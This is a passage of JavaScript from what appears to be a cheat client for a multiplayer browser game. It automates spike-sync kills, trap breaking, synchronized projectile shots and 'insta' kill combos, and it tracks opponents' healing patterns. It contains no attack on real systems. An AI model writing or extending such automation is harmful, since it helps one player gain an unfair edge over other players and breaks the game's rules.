    i = checkPlace(e,t-toRad(15),n)
    i&&(p=true)
    i = checkPlace(e,t+toRad(30),n)
    i&&(p=true)
    i = checkPlace(e,t-toRad(30),n)
    i&&(p=true)
    if(p) return true;
    return false
}
async function spikeTickAids(e,t,g,z,dists) {
    if(!document.getElementById("ppaids").checked||!nearestenemy||secondary!=10||!nearestenemy?.inTrap||clairo2||wr_obj||oneTick||pushing||E.sr!=1||E.pr!=1) return;
    if(primary == 3 || primary == 4 || primary == 5) {
        let coords;
        t = nearestenemy.inTrap
        e = getAimer(E,t)
        g = 75*Variants[E.secondaryVar]*(bH.includes(40)?3.3:1)>=t.health
        z = R.weapons
        dists = [dist(E,t,"object"),dist(E,nearestenemy,"player")]
        // new aids concept for diamond katana, use bull hit or even tank hit to kill with spike sync ez. just that only will work with bull on soldier, and tank on no soldier
        if((dists[0]<=z[secondary].range&&dists[1]<=z[primary].range)&&polePlacer(R.list[spikeType],e,t)&&shieldBypass(E,nearestenemy) && g && (((primary == 5 && E?.primaryVar == 1) || (primary == 4 && E?.primaryVar > 1)) ? (nearestenemy.weaponR == 1 && nearestenemy.weaponIndex <= 10) : true) && E.tailIndex!=11){
            //await nextTick();
            clairo2 = true;
            if(E?.dmgpot?.soldier && nearestenemy.pr == 1 && E?.dmgpot?.shouldHeal && [4, 5].includes(nearestenemy?.primary)) {
                Hg(6, 0);
            } else {
                Hg(40, 0);
            }
            aim[0] = e
            knla.send("D", e)
            visAim = true;
            hold = secondary;
            E.hitting = true;
            knla.send("z",secondary,true)
            breaking = true;
            await nextTick()
            clairo2 = false;
            wr_obj = true;
            hold = primary
            if(E?.dmgpot?.soldier && nearestenemy.pr == 1 && E?.dmgpot?.shouldHeal && [4, 5].includes(nearestenemy?.primary)) {
                Hg(6);
            } else {
                Hg(7);
            }
            knla.send("z",primary, true)
            e= getAimer(E,t)
            E.hitting = true;
            aim[0] = e;
            // pAC(R.list[spikeType],e,t)
            knla.send("D",getAimer(E,nearestenemy))
            //   place(spikeType,e)
            place(spikeType,e+toRad(15),primary)
            place(spikeType,e-toRad(15),primary)
            place(spikeType,getAimer(E,nearestenemy),primary)
            knla.send("D",getAimer(E,nearestenemy))
            knla.send("z",primary, true)
            await nextTick()
            visAim = false;
            hold = null
            breaking = false;
            aim[0] =null;
            wr_obj = false;
        }
    }
}

async function breakShit(e,t,g,g2,z,dists){
    if(primary!=5||E.primaryVar<2||!document.getElementById("ABS").checked||!nearestenemy||secondary!=10||!nearestenemy?.inTrap||clairo2||wr_obj||meleesyncing||oneTick||E.sr!=1||E.pr!=1) return
    let coords;
    t = nearestenemy.inTrap
    e = getAimer(E,t)
    g = 75*Variants[E.secondaryVar]*(bH.includes(40)?3.3:1)>=t.health
    g2 = (75*Variants[E.secondaryVar]*(bH.includes(40)?3.3:1)) + ((nearestenemy.secondary == 10 ? 75 : R.weapons[nearestenemy.primary].dmg)*Variants[E.secondary == 10 ? nearestenemy.secondaryVar : nearestenemy.primaryVar] * 3.3) >= t.health
    z = R.weapons
    dists = [dist(E,t,"object"),dist(E,nearestenemy,"player")]
    //if(dists[0]<=z[secondary].range+20&&g){
    // for(let i=0;i<8;i++){
    //   coords = calcPoint(t.x,t.y,getAimer(t,R),80)
    //Tach?.updateChat(`goto ${coords.x} ${coords.y}`, R.sid);
    //  }
    //}
    if((dists[0]<=z[secondary].range&&dists[1]<=z[primary].range)&&polePlacer(R.list[spikeType],e,t)&&shieldBypass(E,nearestenemy)){
        if(g2) { // other version (their tank hit + mine) break trap then I aids (only if they have hammer though)
            // trap is brand new...
            if((t.health == 500 ? true : (nreload(nearestenemy) == 1 && nearestenemy.weaponR != 1) && nearestenemy.skinIndex != 6 && dists[0]<=z[secondary].range&&dists[1]<=z[primary].range)&&polePlacer(R.list[spikeType],e,t)&&shieldBypass(E,nearestenemy)&&E.tailIndex!=11){
                clairo2 = true;
                Hg(40,0);
                aim[0] = e
                knla.send("D", e, "client")
                visAim = true;
                hold = secondary;
                E.hitting = true;
                knla.send("z",secondary,true)
                breaking = true;

                breakBuild(e,secondary,E.secondaryVar,40,1)
                await nextTick()
                wr_obj = true;
                hold = primary
                Hg(7,18)
                knla.send("z",primary, true)
                e= getAimer(E,t)
                E.hitting = true;
                aim[0] = e;
                // pAC(R.list[spikeType],e,t)
                knla.send("D",getAimer(E,nearestenemy), "client")
                //   place(spikeType,e)
                place(spikeType,e+toRad(15),primary)
                place(spikeType,e-toRad(15),primary)
                place(spikeType,getAimer(E,nearestenemy),primary)
                knla.send("D",getAimer(E,nearestenemy), "client")
                knla.send("z",primary, true)
                await nextTick()
                visAim = false;
                clairo2 = false;
                hold = null
                breaking = false;
                aim[0] =null;
                wr_obj = false;
            }
        }
        if(g) {
            clairo2 = true;
            Hg(40,0);
            aim[0] = e
            knla.send("D", e, "client")
            visAim = true;
            hold = secondary;
            E.hitting = true;
            knla.send("z",secondary,true)
            breaking = true;
            breakBuild(e,secondary,E.secondaryVar,40,1)
            await nextTick()
            wr_obj = true;
            hold = primary
            Hg(7,18)
            knla.send("z",primary, true)
            e= getAimer(E,t)
            E.hitting = true;
            aim[0] = e;
            // pAC(R.list[spikeType],e,t)
            knla.send("D",getAimer(E,nearestenemy), "client")
            //   place(spikeType,e)
            place(spikeType,e+toRad(15),primary)
            place(spikeType,e-toRad(15),primary)
            place(spikeType,getAimer(E,nearestenemy),primary)
            place(spikeType,e,primary)
            knla.send("D",getAimer(E,nearestenemy), "client")
            knla.send("z",primary, true)
            await nextTick()
            visAim = false;
            clairo2 = false;
            hold = null
            breaking = false;
            aim[0] =null;
            wr_obj = false;
        } 
    }
}




function rubyPH(){
    if(!nearestenemy||!E.pr||!E.sr||!(E.primaryVar===3||E.secondaryVar===3)||secondary!=10||primary!=5) return;

}








function maxTime() {
    if(E&&amAlive&&syncTeam) {
        return max(CPH6(E, nearestenemy, 1, 1.5, getAimer(E, nearestenemy)), CPH6(syncTeam, nearestenemy, 1, 1.5, getAimer(syncTeam, nearestenemy)));

    }
}

function maxTime2() {
    if (allies.length > 0 && amAlive && nearestenemy) {
        return max(...allies.map(ally=> CPH6(ally,nearestenemy,1,1.5,getAimer(ally,nearestenemy))))
    }
}
// Global variables
let songList = [];// Array to hold the song URLs
let playedSongs = [];// Array to keep track of played songs
let currentSong = null;// Variable to store the current playing song

function playMusic(songs) {
    songList = songs; // Update the song list

    if (gE('music')?.checked) {
        if (currentSong !== null) {
            currentSong.pause();
        }

        if (playedSongs.length === songList.length) {
            playedSongs = []; // Reset the played songs list
        }

        let randomIndex;
        do {
            randomIndex = floor(Math.random() * songList.length);
        } while (playedSongs.includes(randomIndex));

        const songUrl = songList[randomIndex];

        currentSong = new Audio();
        currentSong.src = songUrl;
        currentSong.preload = "auto";
        currentSong.play();

        currentSong.addEventListener('ended', handleSongEnded);
    } else {
        if (currentSong !== null) {
            currentSong.pause();
        }
    }
}

function handleSongEnded() {
    if (currentSong !== null) {
        currentSong.removeEventListener('ended', handleSongEnded);
        playedSongs.push(songList.indexOf(currentSong.src));
        currentSong = null;
    }
}

// Command to start playing random songs
function startRandomSongs() {
    if (currentSong === null) {
        playMusic(songList);
    }
}

// Example usage:
const songs = [
    'https://cdn.glitch.global/28f0537b-f314-4270-9a7e-9f8c6c223e95/DonToliver-TORE_UP.mp3?v=1720102520354',
    'https://example.com/song2.mp3',
    'https://example.com/song3.mp3',
    // Add more song URLs as needed
];

function shootSync2(e, g) {
  if (R.sr !== 1 || R.tr !== 1 || !nearestenemy || !syncTeam || dist(R,nearestenemy) > 700 || dist(syncTeam, nearestenemy) > 700 || syncTeam.sr !== 1 || syncTeam.tr !== 1) return;

  if (R && amAlive && nearestenemy && syncTeam) {
    var timeDifference;
    var myTurret = CPH6(R, nearestenemy, 1, 1.5, getAimer(R, nearestenemy));
    var time1 = maxTime();
    var time2;
if(R.list[utilityType].name == "platform")place(utilityType,getAimer(R,nearestenemy));

      if(secondary == 15){
   time2 = CPH6(R, nearestenemy, 5, 3.6, getAimer(R, nearestenemy));
      }

    if (secondary == 9) {
      time2 = CPH6(R, nearestenemy, 0, 1.6, getAimer(R, nearestenemy));
    }

    if (secondary == 13) {
      time2 = CPH6(R, nearestenemy, 3, 2.0, getAimer(R, nearestenemy));
    }

    if (secondary == 12) {
      time2 = CPH6(R, nearestenemy, 2, 2.5, getAimer(R, nearestenemy));
    }

    e = (time1 * 111) - (time2 * 111);
    g = (time1 * 111) - (myTurret * 111);
  }

  setTimeout(() => {
    wr_obj = true;
    aim[0] = getAimer(R, nearestenemy);
    visAim = true;
    knla.send("D", getAimer(R, nearestenemy));
    Hg(53, 0);
  }, g);

  setTimeout(() => {
    wr_obj = true;
    aim[0] = getAimer(R, nearestenemy);
    visAim = true;
    knla.send("D", getAimer(R, nearestenemy));
    knla.send("z", secondary, true);
    hold = secondary;
  }, e);

  setTimeout(() => {
    wr_obj = false;
  }, 666);
} 



async function shootSync(e) {
    if (!keys.R || E.sr !== 1 || E.tr !== 1 || !nearestenemy) return;
    if(E&&amAlive&&nearestenemy) {
        var timeDifference;
        var time1 = CPH6(E, nearestenemy, 1, 1.5, getAimer(E, nearestenemy));
        var time2
        if(secondary == 15&&CPH6(E, nearestenemy, 1, 1.5, getAimer(E, nearestenemy))==CPH6(E, nearestenemy, 5, 3.6, getAimer(E, nearestenemy))) {
            time2 = CPH6(E, nearestenemy, 5, 3.6, getAimer(E, nearestenemy));
        } else if(secondary == 15 && CPH6(E, nearestenemy, 1, 1.5, getAimer(E, nearestenemy))!==CPH6(E, nearestenemy, 5, 3.6, getAimer(E, nearestenemy))) {
            time2 = CPH6(E, nearestenemy, 5, 4.68, getAimer(E, nearestenemy));
        }
        if(secondary == 9) {
            time2 = CPH6(E, nearestenemy, 0, 1.6, getAimer(E, nearestenemy));
        }
        if(secondary == 13) {
            time2 = CPH6(E, nearestenemy, 3, 2.0, getAimer(E, nearestenemy));
        }
        if(secondary == 12) {
            time2 = CPH6(E, nearestenemy, 2, 2.5, getAimer(E, nearestenemy));
        }
        e = (time1*111)-(time2*111)
        console.log(e)
    }
    wr_obj = true
    aim[0] = getAimer(E, nearestenemy);
    visAim = true;
    knla.send("D", getAimer(E, nearestenemy));
    Hg(53, 0);

    await delay(e);
    if(CPH6(E, nearestenemy, 1, 1.5, getAimer(E, nearestenemy))!==CPH6(E, nearestenemy, 5, 3.6, getAimer(E, nearestenemy))) {
        Hg(1,0);
    }
    wr_obj = true;
    aim[0] = getAimer(E, nearestenemy);
    visAim = true;
    knla.send("D", getAimer(E, nearestenemy));
    knla.send("z", secondary, true);
    hold = secondary;

    await delay(222);

    wr_obj = false;
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
function CPH6(start, target, projectileType, projectileSpeed, ang) {
    var ux = projectileSpeed * cos(ang);
    var uy = projectileSpeed * sin(ang);

    var distanceToTarget = dist(start, target);
    var time;

    if (projectileType !== 1) {
        time = max((distanceToTarget - 105) / sqrt(ux * ux + uy * uy), 0);
    } else {
        time = max((distanceToTarget - 35) / sqrt(ux * ux + uy * uy), 0);
    }
    var roundedTime;




    roundedTime = floor(time / 111);

    return roundedTime;
}
/* function CPH6(start, target, projectileType, projectileSpeed, ang) {


  var distanceToTarget = dist(start, target);
  var time;

  if (projectileType !== 1) {
    time = Math.max((distanceToTarget - 105) / projectileSpeed, 0);
  } else {
    time = Math.max((distanceToTarget - 35) / projectileSpeed, 0);
  }
    var roundedTime;




   roundedTime = Math.floor(time / 111);

  return roundedTime;
} */


function CPH2(start, target, projectileType, projectileSpeed, ang) {

    var ux = projectileSpeed * cos(ang);
    var uy = projectileSpeed * sin(ang);
    //   let coords = calcPoint(start.x2,start.y2,ang,70)

    var distanceToTarget = dist(E,target);
    var ticks = (distanceToTarget - 35) / (projectileSpeed*111)/// coorprods//Math.sqrt(ux*ux + uy*uy);
    ticks = ticks<1?0:ceil(ticks)
    return ticks;
}


function calcProjs(pT, pS, coords) {

    coords = calcPoint(E.x2,E.y2,getAimer(E,nearestenemy),pT == 1 ? 0 :70)
    return (dist(coords,nearestenemy)-35)/pS
    //   let coords = calcPoint(start.x2,start.y2,ang,70)
    //
    // ///  var distanceToTarget = dist(R,target);
    //  var ticks = (distanceToTarget - 35) / (projectileSpeed*111)/// coorprods//Math.sqrt(ux*ux + uy*uy);
    //ticks = ticks<1?0:Math.ceil(ticks)
    // return ticks;
}










async function Qz(id,d,t,date,bot,_){
    //  let d = t - _.health;
    let cheeser;
    _=findPlayerSID(id)
    if(_.health<=0&&_.vis2&&!_.visible&&!_.didDeath) cAnim(_,55,.28,48,13,.00215,0), _.deaths++, _.didDeath = true;
    if(!E.healths) E.healths = [];
    if(_.sid==E.sid){
        if(E.healths.length >= 8) E.healths.pop()
        if(_.sid == E.sid) E.healths.push({hp:_.health,tick: tick})
    }
    if(d==-5*(_.skinIndex==6?.75:1)&& _.poison){
        _.lastBull = tick-1
        //console.log(_.name, "new poison tick")
    }
    if(_.health<=0)_.Alive=false,_.Alive2 = false;
    if(d<0){
        if(_.sid!=E.sid&&_.dmgs=="XD"){ _.dmgs=0}
        if(_.sid!=E.sid){_.dmgs+=abs(d)}
        if(_==E)E.lastDamage3 = date// console.log(Date.now()-R.lastDamage

        //   _.deathDmgs
    }
    _.dmgsNow.unshift(round(d * 100) / 100)
    if(d > 0){
        //  console.log(d,TIME0-Date.now())
        if(_.skinIndex == 13){
            if(_.tailIndex == 13){
                d == 6 && (_.lastBull = tick-1)
                E == _ && (failsafe = 0);
                return;
            }else{
                d == 3 && (_.lastBull = tick-1)
                E == _ && (failsafe = 0);
                return;
            }
        }
        if(!isNaN(_.shameCount) && _.lastDamage){
            if(date - _.lastDamage<=120){
                _.healTime = date - _.lastDamage2;
                _.shameCount>=8&&_.assumeAge>=7 && abs(time-date)<=2&&d<=10 &&_.loadout.utility==undefined&& (_.loadout.utility = E.list[2])
                cheeser = _.assumeAge>=7 && (_.loadout?.utility?.name=="cheese") && abs(time-date)<=2&&d<=10 ? true:false
                if(!cheeser){
                    _.noAntiList = _.noAntiList.map((a) => a * 0.95);
                    !_.shameUp && (_.shameUp = [])
                    _.shameUp.length>=5&&_.shameUp.shift()
                    _.shameUp.push(_.healTime)
                    _.gainSpeed = _.shameUp.reduce((a, b) => a + b, 0)/_.shameUp.length
                    _.prevShameUp = _.shameCount;
                    if(_.lowHealth <= 40){
                        _.noAntiList[_.shameCount]--;
                    }
                    /*if(_.lowHealth - (R.weapons[primary].dmg * 1.5)) <= 0) {
                    }*/ // add future sync hit here for syncing with teammates
                    _.shameCount = min(8, _.shameCount + 1);
                    /*_.healTrack.push({
                        type: "gain",
                        shameUp: _.shameUp,
                        gainSpeed: _.gainSpeed,
                        prevShameUp: _.prevShameUp,
                        shameCount: _.shameCount,
                        healTime: _.healTime,
                        dmg: d,
                        tick: tick
                    });*/
                    //   if(_.sid === E.sid)console.log(_.healTime);
                    //  _.trackGain.push(_)
                }
            }else{

                cheeser = _.assumeAge>=7 && (_.loadout?.utility?.name=="cheese") && abs(time-date)<=2&&d<=10 ? true:false
                if(!cheeser){

                    _.healTime = date - _.lastDamage2;
                    !_.shameDown&&(_.shameDown = [])
                    _.shameDown.length>=5&&_.shameDown.shift()
                    _.shameDown.push(_.healTime);
                    _.leakSpeed = _.shameDown.reduce((a, b) => a + b, 0)/_.shameDown.length;
                    _.prevShameDown = _.shameCount;
                    // if(_.sid ==R.sid)console.log(R.healTime, " heal leak")
                    //_.sid==R.sid && console.log(_.healTime, " leak",pingval,125-pingval),console.log(healerTime-_.lastDamage2),console.log(TIME0-G0)
                    if(_.lowHealth <= 60){
                        _.noAntiList[_.shameCount]++;
                        //add grubbs test here?
                        let sum = _.noAntiList.reduce((a, b)=>a + (b > 0 ? b : 0), 0);
                        if(sum >= 3){
                            let index = _.noAntiList.indexOf(Math.max(..._.noAntiList));
                            if(_.noAntiList[index] * 2 > sum){
                                _.noAnti = index;
                            }
                        }
                    }
                    _.shameCount = max(0, _.shameCount-2);
                    //if(_.sid != E) {
                    // here we check if they didn't heal the spike and our primary hit can kill them, only when they are not in trap
                    // console.log("yeah", d);
                    //}
                    /*_.healTrack.push({
                        type: "leak",
                        shameDown: _.shameDown,
                        leakSpeed: _.leakSpeed,
                        prevShameUp: _.prevShameUp,
                        shameCount: _.shameCount,
                        healTime: _.healTime,
                        healed: d,
                        tick: tick
                    });*/
                    //  if(nearestenemy && _.sid == nearestenemy.sid) console.log(_.healTime, "shame Down")
                    //  if(_==R)console.log(R.lastDamage, "qz")// console.log(R.healTime)
                    // _.trackLeak.push(_)
                }
            }
            //_.sid==R.sid && console.log(_.healTime,pingval,125-pingval,time-date)//,console.log(healerTime-_.lastDamage2),console.log(TIME0-G0)
            _.lastDamage = 0;
            _.lastDamage2 = 0;
            _.thisHealth = undefined;
        }
        // console.log(cheeser)

    }else{
        _.lowHealth = t;
        //console.log(E.lowHealth, E.noAnti, E.noAntiList);
        _.lastDamage = date//tC//Date.now();
        _.lastDamage2 = date
        _.dmgDate = date
        _.thisHealth = _.health;
        if(!clan(_.sid)&&nearestenemy?.inTrap){
            let tmpspk = renderObjects.filter(e => dist(nearestenemy.inTrap,e)<=(50+e.scale+35)&&(clan(e?.owner?.sid)&&e?.group?.name=='spikes'||nearestenemy&&!nearestenemy.team && e?.group?.name=='spikes'&&e?.owner?.sid!=nearestenemy.sid||e?.type==1 && e.y>=12000));
            if(tmpspk.length&&d==-(tmpspk[0]?.type != 1 ?tmpspk[0]?.dmg:35)*(_.skinIndex==6? .75:1)) _.hitSpike = true
        }
        if(_.sid===E.sid){
            let tmpspk = renderObjects.filter(e => dist(E,e)<=e.scale+35&&(!clan(e?.owner?.sid)&&e?.group?.name=='spikes'||e?.type==1 && e.y>=12000));
            if(tmpspk.length&&d==-(tmpspk[0]?.type != 1 ?tmpspk[0]?.dmg:35)*(_.skinIndex==6? .75:1)){
                _.hitSpike = tmpspk[0];
            }
        }
        if(_.skinIndex == 7){
            if(_.tailIndex == 13){
                if(d == -2){
                    _.lastBull = tick-1
                    _.lastBull2 = Date.now();
                    _.bTT = 1000;

                    return;
                }
            }else{
                if(d == -5){
                    if(_==E){

                        failsafe = 0;
                    }
                    if(E.sid === _.sid) console.log(tick - _.lastBull - 1 , Date.now() - _.lastBull2);
                    _.lastBull2 = Date.now();
                    _.bTT = 1000;
                    _.lastBull = tick-1
                    return;
                }
            }
        }
    }
}
function insta(e){
    if(e == "reverse"){
        let obj = [
            {hit: true,weapon:secondary,hat:53,tail:"none",aim:'closest enemy'},
            {hit: true,weapon:primary,hat:7,tail:"none",aim:'closest enemy'}
        ]
        return obj
    }
    if(e=="apple"){
        let obj = [
            {hit: true,weapon:primary,hat:"none",tail:"none",restrict:{hat:[7,53],tail:[11]},aim:'closest enemy'},
            {hit: true,weapon:secondary,hat:53,tail:"none",aim:'closest enemy'}
        ]
        }
    if(e=="no bull"){
        let obj = [
            {hit: true,weapon:primary,hat:"none",tail:"none",restrict:{hat:[7,53],tail:[11]},aim:'closest enemy'},
            {hit: true,weapon:secondary,hat:53,tail:"none",aim:'closest enemy'}
        ]
        return obj
    }
    if(e=="rubyPH"){
        let obj = [
            {hit: true,weapon:secondary,hat:7,tail:"none",aim:'closest enemy'},
            {hit: true,weapon:primary,hat:7,tail:"none",aim:'closest enemy'}
        ]
        return obj
    }
    if(e=="applePH"){
        let obj = [
            {hit: true,weapon:secondary,hat:53,tail:"none",aim:'closest enemy'},
            {hit: true,weapon:primary,hat:7,tail:"none",aim:'closest enemy'}
        ]
        return obj
    }
    if(e=="regular"){
        let obj = [
            {hit: true,weapon:primary,hat:7,tail:"none",aim:'closest enemy'},
            {hit: true,weapon:secondary,hat:53,tail:"none",aim:'closest enemy'}
        ]
        return obj
    }
    if(e == "age 1"){
        let obj = [
            {hit:true, weapon:primary,hat:7,tail:"none", aim:"closest enemy"},
            {hit:true,weapoon:primary,hat:7,tail:"none", aim:"closest enemy"},
            {hit: true,weapon:secondary,hat:53,tail:"none",aim:"closest enemy"},
            {hit: true,weapon:secondary,hat:"none",tail:"none",aim:"closest enemy"},
            {hit: true,weapon:primary,hat:7,tail:"none",aim:"closest enemy"},
        ]
        return obj;
    }
    if(e == "bow insta"){

    }
}
function miller(){
    if(!amAlive||mills.status==false||!E.canBuild(R.list[millType])) return (mills.status = false);
    if(dist2(E,mills) > 100) {
        if(mills.status) {
            place(millType, moveDirection+toRad(180));
            place(millType, moveDirection+toRad(180) - toRad(69));
            place(millType, moveDirection+toRad(180)+ toRad(69));
        }
        mills.x = E.x2, mills.y = E.y2;
    }
}

function Hq(e, t,override, priority, objInfo,type,n,i,x,y,blocker,isItem,checker) {
    //    if(n) r = true;
    n = R.list[e];
    // restrictPlace = []
    //restrictPlace.length &&(restrictPlace = restrictPlace.filter((t)=>ue.checkItemLocation3(t.x,t.y,t.scale,.6,t.id,false)==true&&tick-t.tick<1))
    n?.name == "blocker"? blocker = 300 :blocker = 0;
    // (n.name == "blocker"||n.name=="pit trap"||n.name == "teleporter"||n.name == "boost pad"||n.name == "healing pad"||n.name == "sapling") ?isItem = true:isItem = false;
    if(!n) return;
    i = (35 + n.scale + (n.placeOffset || 0));
    //  if(r) return n && ue.checkItemLocation(R.x2 + Math.cos(t) * i, R.y2 + Math.sin(t) * i, n.scale, .6, n.id, false)
    x = E.x2 + cos(t) * i
    y = E.y2 + sin(t) * i

    if(type == "outplace"){
        checker = ue.checkItemLocation3(x, y, n?.scale, .6, n?.id, false,true)
    } else {
        checker = ue.checkItemLocation(x, y, n?.scale, .6, n?.id, false, priority)
    }
    if(override||checker&&!override)visAim = true;
    //override === true&& place(e, t)

    if(n && (checker || override)){
        place(e, t)
        if(objInfo){
            ue.add(tick, objInfo.x, objInfo.y, objInfo.angle, objInfo.scale, null, R.list[objInfo.item.id], !0,{sid: E.sid},false, false, true,true)
        }
    }
    let obj = R.list[e]
    // console.log(ue.checkItemLocation(x, y, n.scale, .6, n.id, false),n.name)
    /* let obj = {x:x,y:y,blocker:blocker,isItem:true,colDiv:n.colDiv,scale:n.scale,type:null,tick:tick,id:n.id}
        obj.getScale = function(e, t) {
            return e = e || 1, this.scale * (this.isItem || 2 == this.type || 3 == this.type || 4 == this.type ? 1 :
                .6 * e) * (t ? 1 : this.colDiv)
        }*/
    if(checker){
        //ue.add(tick, x, y, t, obj.scale, null, R.list[e], !0,{sid: E.sid},false,true,false,true)
    }
    if(override&&!checker){
        // ue.add(tick, x, y, t, obj.scale, null, R.list[e], !0,{sid: E.sid},false,true,false,true)
        //restrictPlace.push(obj)
        //autoplacing = nearObjects.concat(restrictPlace)//.filter(e => keys.rc&&R.hitting&&(e.health>10*7.5*3.3*(Variants[R.secondaryVar]||1))|| !keys.rc)
    }
    //console.log(ue.checkItemLocation(R.x2 + Math.cos(t) * i, R.y2 + Math.sin(t) * i, n.scale, .6, n.id, false));
};
function checkItemlocation(e, n, i, r, s, a, l){
    for (var h = 0; h < renderObjects.length; ++h) {
        let obj = renderObjects[h]
        var u = obj.blocker ? obj.blocker : obj.getScale(r, obj.isItem);
        if (dist({x:e,y:n},obj)/*s.getDistance(e, n, N[h].x, N[h].y)*/ < i + u) return !1
    }
    return !(!a && 18 != s && n >= T.mapScale / 2 - T.riverWidth / 2 && n <= T.mapScale / 2 + T.riverWidth /2)
}

function posweps(_){

}
function dmgpot(t){
    if(!amAlive) return;
    let ez = {
        hp: 0,
        primary: 0,
        secondary: 0,
        maxOT: 0,
        turretGear: 0,
        add:0,
        inrange: 0,
        spikes: 0,
        soldier: 0,
        forceSoldier: 0,
        shouldHeal: false,
        //     currentHat: E.skinIndex
    }
    for(let i = enemies.length, e; i--;) {
        //enemies.forEach((e) => {
        // for(let i=0;i<enemies.length;i++){
        //   e = enemies[i]
        //  const distanceX = E.x2 - e.x2;
        //  const distanceY = E.y2 - e.y2;
        //  const distance = Math.sqrt(distanceX * distanceX + distanceY * distanceY);
        //const speedTowardsTarget = Math.abs((e.xVel * distanceX + e.yVel * distanceY) / distance);
        t = (e = enemies[i]).dmgpot.range + e.movSpd + E.movSpd + 50;
        if(dist(E, e, "player") <= t) {
            if(ez.hp == null || ez.hp == undefined) ez.hp = e.dmgpot.min + E.hitProjs;
            e.dmgpot.min > ez.hp && (ez.hp = e.dmgpot.min)
            ez.primary += e.dmgpot.primary;
            ez.secondary+=e?.dmgpot.secondary;
            ez.add+= (ez.primary+ez.secondary);
            ez.turretGear+=e?.dmgpot.turretGear
            ez.inrange+=1;
            ez.spikes += ez.spikes;
            !ez.soldier && (e.dmgpot.soldier||ez.primary>=100||E.hitProjs>=100) && (ez.soldier = true);
            !ez.forceSoldier && (e.dmgpot.forceSoldier) && (ez.forceSoldier = true);
            // if(enemyPlacement(e.loadout.spike,getAimer(nearestenemy,E))) ez.spikeSync = e.primary +
        }
    }
    //  }
    //})
    ez.shouldHeal = ez.hp>=E.health
    return ez;
}
function playerdmgs(_){
    // if(!amAlive) return;

    let dF = {
        primary: 0,
        secondary: 0,
        turretGear: 0,
        soldier: false,
        forceSoldier: false,
        min: 0,
        m1: 0,
        spikes: 0,
        m2: 0,
    }
    let sndwep = !_.secondary ? 15 : _.secondary;
    let prmrywep = !isNaN(_.primary) && _.primary != null ? _.primary : 5;
    let ps = R.weapons.filter(e=>e.age>_.assumeAge&&e.id>8&&(null == e?.pre||e.uF.includes(sndwep)&&!e.uF.includes(prmrywep)))
    ps.length ? (ps = ps.reduce((prev,curr) => (prev.dmg > curr.dmg) ? prev : curr)):(ps=0);
    let pp = R.weapons.filter(e=>e.age>_.assumeAge&&e.id<=8&&(null == e?.pre||e.uF.includes(prmrywep)&& e.uF.includes(sndwep)&&e.uF.includes(ps?.id)))
    pp.length ? (pp = pp.reduce((prev,curr) => (prev.dmg > curr.dmg) ? prev : curr)):(pp=0);
    let priDmg = pp!==0 && (prmrywep&&_.pr==1 && R.weapons[prmrywep].dmg<pp.dmg||!_.pr&&prmrywep)? pp.dmg*(_.tailIndex===11 ?1 : 1.5):prmrywep &&_.pr==1? R.weapons[prmrywep]?.dmg*Variants[_?.primaryVar]*1.5:0
    let secDmg = ps!==0 && (sndwep&&_.sr==1 && R.weapons[sndwep].dmg<ps.dmg||!_.sr&&sndwep)? ps.dmg*(ps.projectile == undefined ?1.5:1):sndwep &&_.sr==1? R.weapons[sndwep].dmg*(R.weapons[sndwep].projectile == undefined ?Variants[_?.secondaryVar]*(_.tailIndex===11 ?1 : 1.5):1):0
    if(priDmg&& _.primaryVar == 3&&E.bleed === 0||E.poison>0&&E.bleed === 0) priDmg+=5
    if(secDmg&&(_.secondary == 10 || _.secondary == 14) &&E.bleed === 0||E.poison>0&&E.bleed === 0) secDmg+=5
    let kbs = onion(E,getAimer(_.np.real,E.np.real),dist(E,_.kbpot.fpriTKB),true,0)
    let kb2 = onion(E,getAimer(_.np.real,E.np.real),dist(E,_.kbpot.priKB),true,0)
    let spikePush = nearObjects
    .filter(e => inTrap && e?.group?.name === 'spikes' && (!e.manualBreak || !e.assumeBreak) && (dist(E,_)<= 130 && dAng(getAimer(_,e),getAimer(_,E)) <= 3)&& !clan(e.owner.sid) && dist(E, e, 'object') <= (secondary === 10 ? 75 : R.weapons[primary]?.range))
    .sort((a, b) => dist(E, a, 'object') - dist(E, b, 'object')); // can do some check to see if i'm actually the closest enemy to the person trying to spike hit sync me since MAJORITY of mods do nearestEnemy.
    let kbSpike = 0, colSpike = 0;
    let sbp = nearObjects.filter(x => (x.name == "pit trap" || x.group?.name == "spikes" || x.type === 1 && x.y >= 12000) && x.distance <= 450); // if this lags, remove it
    //         console.log(C.getAngleDist(Math.atan2(_.y2 - E.y2, _.x2 - E.x2), Math.atan2(spikes1[i].y - E.y2, spikes1[i].x - E.x2)));
    dF.range = pp?.range!=undefined && pp?.range> R.weapons[prmrywep].range?pp?.range:R.weapons[prmrywep].range;
    /*   if(_.primary == undefined) {
            dF.range = l.weapons[5].range
        }*/

    dF.primary += priDmg;
    if((_.secondary === 10 || _.secondary == 14) && dist(E,_,"player") <= R.weapons[sndwep].range ||
       !isNaN(R.weapons[sndwep]?.projectile) && dist(E,_)-105 <= R.projectiles[R?.weapons[sndwep]?.projectile]?.range*111+40){
        dF.secondary+=secDmg;
    }
    if(_.placePot.onPlayer.length && sbp.length) {
        let kbSpiker = knockIntoP(_.placePot.onPlayer, sbp, E);
        if (kbSpiker.building && (kbSpiker.bounce || kbSpiker.building.name != "pit trap")) {
            kbSpike = kbSpiker.building.dmg;
            KB(kbSpiker.newPos);
        }
    }
    if(spikePush.length > 0) for(let m = spikePush.length; m--;) {
        let spk = spikePush[m];
        if(dist(E, _, "player") <= R.weapons[prmrywep].range && (dist(E, spk) <= 35 + spk.realScale || E.spdMult > 0 && dist(E.np.decel, spk) <= 35 + spk.realScale + 3.5)) { // first condition = im literally already pushed in...
            colSpike += spk.dmg;
            if(_.pr == 1 && (prmrywep == 3 || prmrywep == 4 || prmrywep == 5) && colSpike + dF.primary >= E.health) dF.forceSoldier = true;
            if(dF.forceSoldier) {
          
            }
        }
        // decel kinda useless
        //console.log(E.movSpd, `Decel ${dist(E.np.decel, spk)}`, `Reg: ${ dist(E, spk)}`, 35 + spk.realScale);
    }
    dF.spikes = 0;
    // still possible for enemy to have spike collide with u in trap
    dF.spikes = /*inTrap ? colSpike + (_.placePot.onPlayer.length ? _.loadout.spike.dmg : 0) :*/ _.placePot.onPlayer.length ? _.loadout.spike.dmg + kbSpike : kbs && !inTrap ? kbs.obj.dmg : 0;
    if(_.tr === 1 && seeInRange(E, _, 1.5 * 111 + 60, 0, 1)){
        dF.turretGear += 25;
    }
    dF.m1 = dF.primary;
    dF.m2 = (dF.secondary+dF.turretGear);
